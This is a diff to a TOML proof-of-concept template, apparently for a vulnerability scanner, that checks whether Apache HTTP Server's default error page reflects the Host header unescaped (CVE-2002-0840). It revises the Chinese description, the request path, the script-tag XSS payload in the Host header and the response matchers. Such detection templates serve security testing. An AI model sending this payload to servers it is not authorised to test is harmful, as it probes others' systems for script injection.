@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测Apache HTTP Server默认错误页面Host Header反射型XSS漏洞(CVE-2002-0840)。当UseCanonicalName设置为Off且支持通配符DNS时，向服务器发送包含恶意Host头的HTTP请求，若默认错误页面原样回显Host头内容则存在漏洞。"
+author = "ave"
+description = "验证 Apache HTTP Server 默认错误页面对 Host 头的 XSS 漏洞（CVE-2002-0840）。当 UseCanonicalName 为 Off 且启用通配符 DNS 时，恶意 Host 头会被反射在错误页面中导致 XSS。"
 id = "POC-AVE-2002-0027"
-name = "Apache HTTP Server Host Header XSS PoC"
+name = "CVE-2002-0840 PoC"
 severity = "medium"
 tags = ["ave-2002-0027"]
 vuln_id = [
@@ -15,14 +15,23 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/nonexistent"
+path = "/nonexistent-path-trigger-404"
 protocol = "http"
 
 [poc.requests.headers]
-Host = "''><script>alert('XSS')</script>"
+Host = "<script>alert('XSS-CVE-2002-0840')</script>.example.com"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["<script>alert('XSS')</script>"]
+words = ["<script>alert('XSS-CVE-2002-0840')</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    404,
+    400,
+    500,
+]
+type = "status"
